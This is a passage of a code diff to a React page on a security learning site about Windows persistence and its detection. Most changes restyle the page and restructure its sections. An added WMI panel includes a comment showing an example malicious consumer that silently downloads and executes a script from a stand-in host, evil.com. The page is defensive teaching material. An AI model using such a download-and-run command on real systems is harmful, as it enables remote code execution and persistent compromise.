+                        Defines WHAT ACTION to take (CommandLine, ActiveScript, or LogFile consumer)
+                      </Typography>
+                    </Paper>
+                  </Grid>
+                  <Grid item xs={12} md={4}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2, textAlign: "center" }}>
+                      <Typography variant="subtitle2" sx={{ color: "#f59e0b", fontWeight: 700, mb: 1 }}>
+                        3️⃣ Binding
+                      </Typography>
+                      <Typography variant="caption" sx={{ color: "grey.400" }}>
+                        Connects Filter to Consumer to create the active subscription
+                      </Typography>
+                    </Paper>
+                  </Grid>
+                </Grid>
+                <Alert severity="error" sx={{ mb: 2 }}>
+                  <Typography variant="body2">
+                    <strong>Why WMI Persistence is Dangerous:</strong> It's fileless (stored in WMI repository), persists across reboots, runs with SYSTEM
+                    privileges, and requires specialized tools to detect. Traditional antivirus won't find it because there's no file on disk to scan.
+                  </Typography>
+                </Alert>
+                <CodeBlock language="powershell" code={`# Enumerate WMI event subscriptions (detection)
+Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Select-Object Name, Query
+Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer | Select-Object Name, CommandLineTemplate
+Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding
+
+# Example malicious WMI subscription structure:
+# Filter: SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 30
+# Consumer: powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
+# Binding: Links the filter to the consumer`} />
+              </Paper>
+
               <Grid container spacing={2}>
                 {persistenceCategories.map((item) => (
                   <Grid item xs={12} md={6} key={item.title}>
                     <Paper
                       sx={{
                         p: 2,
-                        bgcolor: "#0c0f1c",
+                        bgcolor: theme.bgNested,
                         borderRadius: 2,
-                        border: "1px solid rgba(59,130,246,0.2)",
+                        border: `1px solid ${alpha(theme.primary, 0.2)}`,
                         height: "100%",
                       }}
                     >
-                      <Typography variant="subtitle1" sx={{ color: "#e2e8f0", fontWeight: 600 }}>
+                      <Typography variant="subtitle1" sx={{ color: theme.text, fontWeight: 600 }}>
                         {item.title}
                       </Typography>
                       <Typography variant="body2" sx={{ color: "grey.400", mb: 1 }}>
@@ -1626,8 +2142,8 @@ Recommendation: <remove, restrict, allowlist, monitor>`;
                 ))}
               </Grid>
 
-              <Paper sx={{ p: 2.5, mt: 3, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
-                <Typography variant="h6" sx={{ color: "#3b82f6", mb: 1 }}>
+              <Paper sx={{ p: 2.5, mt: 3, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ color: theme.primary, mb: 1 }}>
                   MITRE ATT&CK Mapping (High Level)
                 </Typography>
                 <TableContainer>
@@ -1652,8 +2168,8 @@ Recommendation: <remove, restrict, allowlist, monitor>`;
                 </TableContainer>
               </Paper>
 
-              <Paper sx={{ p: 2.5, bgcolor: "#0c0f1c", borderRadius: 2 }}>
-                <Typography variant="h6" sx={{ color: "#a5b4fc", mb: 1 }}>
+              <Paper sx={{ p: 2.5, bgcolor: theme.bgNested, borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ color: theme.secondary, mb: 1 }}>
                   Category Selection Tips
                 </Typography>
                 <List dense>
@@ -1672,18 +2188,29 @@ Recommendation: <remove, restrict, allowlist, monitor>`;
                   ))}
                 </List>
               </Paper>
-            </Box>
-          </TabPanel>
+          </Paper>
+        </Box>
 
-          <TabPanel value={tabValue} index={2}>
-            <Box sx={{ p: 3 }}>
+        {/* Section: Common Locations */}
+        <Box id="common-locations" sx={{ mt: 4, scrollMarginTop: 80 }}>
+          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
+            <Box sx={{ mb: 3 }}>
+              <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
+                <SearchIcon sx={{ color: theme.warning }} />
+                <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.warning} 0%, ${theme.primary} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
+                  Common Locations
+                </Typography>
+              </Box>
+              <Divider sx={{ mt: 2, borderColor: theme.border }} />
+            </Box>
+
               <TableContainer sx={{ mb: 3 }}>
                 <Table size="small">
                   <TableHead>
                     <TableRow>
-                      <TableCell sx={{ color: "#3b82f6" }}>Location</TableCell>
-                      <TableCell sx={{ color: "#3b82f6" }}>Purpose</TableCell>
-                      <TableCell sx={{ color: "#3b82f6" }}>Red Flag Signal</TableCell>
+                      <TableCell sx={{ color: theme.primary }}>Location</TableCell>
+                      <TableCell sx={{ color: theme.primary }}>Purpose</TableCell>
+                      <TableCell sx={{ color: theme.primary }}>Red Flag Signal</TableCell>
                     </TableRow>
                   </TableHead>
                   <TableBody>
@@ -1698,8 +2225,8 @@ Recommendation: <remove, restrict, allowlist, monitor>`;
                 </Table>
               </TableContainer>
 
-              <Paper sx={{ p: 2.5, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
-                <Typography variant="h6" sx={{ color: "#3b82f6", mb: 1 }}>
+              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ color: theme.primary, mb: 1 }}>
                   Triage Prompts
                 </Typography>
                 <List dense>
@@ -1714,17 +2241,17 @@ Recommendation: <remove, restrict, allowlist, monitor>`;
                 </List>
               </Paper>
 
-              <Paper sx={{ p: 2.5, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
-                <Typography variant="h6" sx={{ color: "#a5b4fc", mb: 1 }}>
+              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ color: theme.secondary, mb: 1 }}>
                   Path Risk Guide
                 </Typography>
                 <TableContainer>
                   <Table size="small">
                     <TableHead>
                       <TableRow>
-                        <TableCell sx={{ color: "#3b82f6" }}>Location</TableCell>
-                        <TableCell sx={{ color: "#3b82f6" }}>Risk</TableCell>
-                        <TableCell sx={{ color: "#3b82f6" }}>Why it matters</TableCell>
+                        <TableCell sx={{ color: theme.primary }}>Location</TableCell>
+                        <TableCell sx={{ color: theme.primary }}>Risk</TableCell>
+                        <TableCell sx={{ color: theme.primary }}>Why it matters</TableCell>
                       </TableRow>
                     </TableHead>
                     <TableBody>
@@ -1740,7 +2267,7 @@ Recommendation: <remove, restrict, allowlist, monitor>`;
                 </TableContainer>
               </Paper>
 
-              <Accordion>
+              <Accordion sx={{ bgcolor: theme.bgNested }}>
                 <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                   <Typography variant="h6">Safe Enumeration Commands</Typography>
                 </AccordionSummary>
@@ -1770,7 +2297,7 @@ Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer`}
                 </AccordionDetails>
               </Accordion>
 
-              <Accordion>
+              <Accordion sx={{ bgcolor: theme.bgNested }}>
                 <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                   <Typography variant="h6">Signature and Hash Checks</Typography>
                 </AccordionSummary>
@@ -1787,7 +2314,7 @@ sigcheck -q -h -i "C:\\Path\\to\\binary.exe"`}
                 </AccordionDetails>
               </Accordion>
 
-              <Accordion>
+              <Accordion sx={{ bgcolor: theme.bgNested }}>
                 <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                   <Typography variant="h6">Command Cheat Sheet</Typography>
                 </AccordionSummary>
@@ -1796,8 +2323,8 @@ sigcheck -q -h -i "C:\\Path\\to\\binary.exe"`}
                     <Table size="small">
                       <TableHead>
                         <TableRow>
-                          <TableCell sx={{ color: "#3b82f6" }}>Command</TableCell>
-                          <TableCell sx={{ color: "#3b82f6" }}>What it tells you</TableCell>
+                          <TableCell sx={{ color: theme.primary }}>Command</TableCell>
+                          <TableCell sx={{ color: theme.primary }}>What it tells you</TableCell>
                         </TableRow>
                       </TableHead>
                       <TableBody>
@@ -1818,13 +2345,24 @@ sigcheck -q -h -i "C:\\Path\\to\\binary.exe"`}
                   </TableContainer>
                 </AccordionDetails>
               </Accordion>
-            </Box>
-          </TabPanel>
+          </Paper>
+        </Box>
 
-          <TabPanel value={tabValue} index={3}>
-            <Box sx={{ p: 3 }}>
-              <Paper sx={{ p: 2.5, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
-                <Typography variant="h6" sx={{ color: "#3b82f6", mb: 1 }}>
+        {/* Section: Detection and Logs */}
+        <Box id="detection-logs" sx={{ mt: 4, scrollMarginTop: 80 }}>
+          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
+            <Box sx={{ mb: 3 }}>
+              <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
+                <BuildIcon sx={{ color: theme.success }} />
+                <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.success} 0%, ${theme.primary} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
+                  Detection & Logs
+                </Typography>
+              </Box>
+              <Divider sx={{ mt: 2, borderColor: theme.border }} />
+            </Box>
+
+              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ color: theme.primary, mb: 1 }}>
                   Detection Signals
                 </Typography>
                 <List dense>
@@ -1839,8 +2377,8 @@ sigcheck -q -h -i "C:\\Path\\to\\binary.exe"`}
                 </List>
               </Paper>
 
-              <Paper sx={{ p: 2.5, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
-                <Typography variant="h6" sx={{ color: "#a5b4fc", mb: 1 }}>
+              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ color: theme.secondary, mb: 1 }}>
                   Correlation Ideas
                 </Typography>
                 <List dense>
@@ -1855,8 +2393,8 @@ sigcheck -q -h -i "C:\\Path\\to\\binary.exe"`}
                 </List>
               </Paper>
 
-              <Paper sx={{ p: 2.5, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
-                <Typography variant="h6" sx={{ color: "#a5b4fc", mb: 1 }}>
+              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ color: theme.secondary, mb: 1 }}>
                   Useful Windows Event IDs
                 </Typography>
                 <List dense>
@@ -1871,8 +2409,8 @@ sigcheck -q -h -i "C:\\Path\\to\\binary.exe"`}
                 </List>
               </Paper>
 
-              <Paper sx={{ p: 2.5, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
-                <Typography variant="h6" sx={{ color: "#3b82f6", mb: 1 }}>
+              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ color: theme.primary, mb: 1 }}>
                   Response Checklist
                 </Typography>
                 <List dense>
@@ -1887,8 +2425,8 @@ sigcheck -q -h -i "C:\\Path\\to\\binary.exe"`}
                 </List>
               </Paper>
 
-              <Paper sx={{ p: 2.5, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
-                <Typography variant="h6" sx={{ color: "#3b82f6", mb: 1 }}>
+              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ color: theme.primary, mb: 1 }}>
                   Hardening Checklist
                 </Typography>
                 <List dense>
@@ -1903,8 +2441,8 @@ sigcheck -q -h -i "C:\\Path\\to\\binary.exe"`}
                 </List>
               </Paper>
 
-              <Paper sx={{ p: 2.5, bgcolor: "#0c0f1c", borderRadius: 2 }}>
-                <Typography variant="h6" sx={{ color: "#a5b4fc", mb: 1 }}>
+              <Paper sx={{ p: 2.5, bgcolor: theme.bgNested, borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ color: theme.secondary, mb: 1 }}>
                   Evidence Checklist
                 </Typography>
                 <List dense>
@@ -1918,13 +2456,24 @@ sigcheck -q -h -i "C:\\Path\\to\\binary.exe"`}
                   ))}
                 </List>
               </Paper>
-            </Box>
-          </TabPanel>
+          </Paper>
+        </Box>
 
-          <TabPanel value={tabValue} index={4}>
-            <Box sx={{ p: 3 }}>
-              <Paper sx={{ p: 2.5, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
-                <Typography variant="h6" sx={{ color: "#3b82f6", mb: 1 }}>
+        {/* Section: Beginner Lab */}
+        <Box id="beginner-lab" sx={{ mt: 4, scrollMarginTop: 80 }}>
+          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
+            <Box sx={{ mb: 3 }}>
+              <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
+                <SchoolIcon sx={{ color: theme.accent }} />
+                <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.accent} 0%, ${theme.primary} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
+                  Beginner Lab
+                </Typography>
+              </Box>
+              <Divider sx={{ mt: 2, borderColor: theme.border }} />
+            </Box>
+
+              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ color: theme.primary, mb: 1 }}>
                   Beginner Lab Walkthrough (Read-only)
                 </Typography>
                 <List dense>
@@ -1945,8 +2494,8 @@ sigcheck -q -h -i "C:\\Path\\to\\binary.exe"`}
                 </List>
               </Paper>
 
-              <Paper sx={{ p: 2.5, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
-                <Typography variant="h6" sx={{ color: "#a5b4fc", mb: 1 }}>
+              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ color: theme.secondary, mb: 1 }}>
                   Success Criteria
                 </Typography>
                 <List dense>
@@ -1961,8 +2510,8 @@ sigcheck -q -h -i "C:\\Path\\to\\binary.exe"`}
                 </List>
               </Paper>
 
-              <Paper sx={{ p: 2.5, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
-                <Typography variant="h6" sx={{ color: "#3b82f6", mb: 1 }}>
+              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ color: theme.primary, mb: 1 }}>
                   Stretch Goals
                 </Typography>
                 <List dense>
@@ -1977,7 +2526,7 @@ sigcheck -q -h -i "C:\\Path\\to\\binary.exe"`}
                 </List>
               </Paper>
 
-              <Accordion>
+              <Accordion sx={{ bgcolor: theme.bgNested }}>
                 <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                   <Typography variant="h6">Report Template</Typography>
                 </AccordionSummary>
@@ -1985,43 +2534,86 @@ sigcheck -q -h -i "C:\\Path\\to\\binary.exe"`}
                   <CodeBlock language="text" code={reportTemplate} />
                 </AccordionDetails>
               </Accordion>
-            </Box>
-          </TabPanel>
-        </Paper>
+          </Paper>
+        </Box>
 
-        <Paper
-          id="quiz-section"
-          sx={{
-            mt: 4,
-            p: 4,
-            borderRadius: 3,
-            border: `1px solid ${alpha(QUIZ_ACCENT_COLOR, 0.2)}`,
-          }}
-        >
-          <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
-            <QuizIcon sx={{ color: QUIZ_ACCENT_COLOR }} />
-            Knowledge Check
-          </Typography>
-          <QuizSection
-            questions={quizQuestions}
-            accentColor={QUIZ_ACCENT_COLOR}
-            title="Windows Persistence Knowledge Check"
-            description="Random 10-question quiz drawn from a 75-question bank each time you start the quiz."
-            questionsPerQuiz={QUIZ_QUESTION_COUNT}
-          />
-        </Paper>
+        {/* Section: Knowledge Check */}
+        <Box id="quiz-section" sx={{ mt: 4, scrollMarginTop: 80 }}>
+          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${alpha(QUIZ_ACCENT_COLOR, 0.2)}`, overflow: "hidden", p: 3 }}>
+            <Box sx={{ mb: 3 }}>
+              <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
+                <QuizIcon sx={{ color: QUIZ_ACCENT_COLOR }} />
+                <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${QUIZ_ACCENT_COLOR} 0%, ${theme.primaryLight} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
+                  Knowledge Check
+                </Typography>
+              </Box>
+              <Divider sx={{ mt: 2, borderColor: theme.border }} />
+            </Box>
+
+            <QuizSection
+              questions={quizQuestions}
+              accentColor={QUIZ_ACCENT_COLOR}
+              title="Windows Persistence Knowledge Check"
+              description="Random 10-question quiz drawn from a 75-question bank each time you start the quiz."
+              questionsPerQuiz={QUIZ_QUESTION_COUNT}
+            />
+          </Paper>
+        </Box>
 
         <Box sx={{ mt: 4, textAlign: "center" }}>
           <Button
             variant="outlined"
             startIcon={<ArrowBackIcon />}
             onClick={() => navigate("/learn")}
-            sx={{ borderColor: "#3b82f6", color: "#3b82f6" }}
+            sx={{ borderColor: theme.primary, color: theme.primary }}
           >
             Back to Learning Hub
           </Button>
         </Box>
+        </Grid>
+        </Grid>
       </Container>
+
+      {/* Mobile Navigation Drawer */}
+      <Drawer
+        anchor="left"
+        open={navDrawerOpen}
+        onClose={() => setNavDrawerOpen(false)}
+        sx={{ display: { xs: "block", md: "none" } }}
+        PaperProps={{ sx: { bgcolor: theme.bgCard, width: 280 } }}
+      >
+        <Box sx={{ p: 2, borderBottom: `1px solid ${theme.border}` }}>
+          <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
+            <Typography variant="h6" sx={{ color: theme.primary, fontWeight: 700 }}>
+              Navigation
+            </Typography>
+            <IconButton onClick={() => setNavDrawerOpen(false)} sx={{ color: "grey.400" }}>
+              <CloseIcon />
+            </IconButton>
+          </Box>
+        </Box>
+        {sidebarNav}
+      </Drawer>
+
+      {/* Mobile FABs */}
+      {isMobile && (
+        <>
+          <Fab
+            size="small"
+            onClick={() => setNavDrawerOpen(true)}
+            sx={{ position: "fixed", bottom: 80, right: 16, bgcolor: theme.primary, color: "white", "&:hover": { bgcolor: theme.primaryLight } }}
+          >
+            <ListAltIcon />
+          </Fab>
+          <Fab
+            size="small"
+            onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })}
+            sx={{ position: "fixed", bottom: 24, right: 16, bgcolor: alpha(theme.primary, 0.8), color: "white", "&:hover": { bgcolor: theme.primary } }}
+          >
+            <KeyboardArrowUpIcon />
+          </Fab>
+        </>
+      )}
     </Box>
     </LearnPageLayout>
   );
